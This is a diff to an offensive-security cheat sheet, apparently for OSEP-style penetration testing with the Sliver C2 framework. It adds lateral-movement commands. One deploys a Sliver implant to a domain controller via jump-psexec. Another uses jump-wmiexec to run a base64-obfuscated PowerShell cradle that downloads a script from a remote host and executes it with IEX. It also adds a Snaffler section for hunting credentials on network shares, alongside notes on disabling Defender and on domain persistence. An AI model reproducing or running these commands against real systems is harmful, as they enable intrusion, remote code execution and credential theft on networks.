@@ -9,6 +9,7 @@ The C# and PowerShell files throughout the cheat sheet should be publicly access
 
 ## Table of Contents
 
+
 - [Table of Contents](#table-of-contents)
 - [Q & A](#q--a)
 - [Installation](#installation)
@@ -74,9 +75,12 @@ The C# and PowerShell files throughout the cheat sheet should be publicly access
 	- [Portfwd](#portfwd)
 	- [Socks5 Proxy](#socks5-proxy)
 	- [Ligolo](#ligolo)
+		- [Subnet Access](#subnet-access)
 		- [Port Forwarding through Ligolo](#port-forwarding-through-ligolo)
 - [Lateral Movement](#lateral-movement)
 	- [PsExec](#psexec)
+	- [jump-psexec](#jump-psexec)
+	- [jump-wmiexec](#jump-wmiexec)
 	- [SharpRDP](#sharprdp)
 - [Domain Enumeration](#domain-enumeration)
 	- [Laps](#laps)
@@ -88,6 +92,8 @@ The C# and PowerShell files throughout the cheat sheet should be publicly access
 		- [PowerView](#powerview)
 		- [ADSearch](#adsearch)
 	- [Shares Enumeration](#shares-enumeration)
+		- [SharpShares](#sharpshares)
+		- [Snaffler](#snaffler)
 - [Domain Exploitation](#domain-exploitation)
 	- [Persistence](#persistence)
 	- [Kerberoasting](#kerberoasting)
@@ -139,7 +145,6 @@ The C# and PowerShell files throughout the cheat sheet should be publicly access
 	- [jump-psexec](#jump-psexec)
 	- [jump-wmiexec](#jump-wmiexec)
 - [Armory Packages List](#armory-packages-list)
-
 
 
 ## Q & A
@@ -1252,6 +1257,7 @@ socks5 start
 
 > Make sure defender is disabled or ligolo might get removed
 
+#### Subnet Access
 
 ```powershell
 # Upload the agent
@@ -1352,6 +1358,20 @@ psexec -d Title -s Description -p osep-lateral DC06
 
 # Use the new session
 use a4a458c1
+```
+
+
+### jump-psexec
+
+```powershell
+jump-psexec dc04 AgentSvc /home/kali/OSEP/hav0c/sliver.x64.exe //dc04/c$/file2.exe
+```
+
+
+### jump-wmiexec
+
+```powershell
+jump-wmiexec client09 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='
 ```
 
 
@@ -1544,6 +1564,8 @@ execute-assembly /home/kali/tools/bins/csharp-files/ADSearch.exe --search "(obje
 
 ### Shares Enumeration
 
+#### SharpShares
+
 > Takes a lot of time, if lots of share - Better to run within `shell`
 
 ```powershell
@@ -1551,11 +1573,20 @@ execute-assembly -t 200 /home/kali/tools/bins/csharp-files/SharpShares.exe /ldap
 ```
 
 
+#### Snaffler
+
+Goes through all the network shares and their files to find out any credentials or sensitive information. Really useful for actual gigs. Better to run within `shell`
+
+```powershell
+execute-assembly -t 200 /home/kali/tools/bins/csharp-files/Snaffler.exe -s
+```
+
+
 ## Domain Exploitation
 
 ### Persistence
 
-> Run as NT\Auth or Admin on the DC
+> Run as NT\Auth or Local/Domain Admin on the DC
 
 Creates a new domain user and adds it into DA and EA groups
 
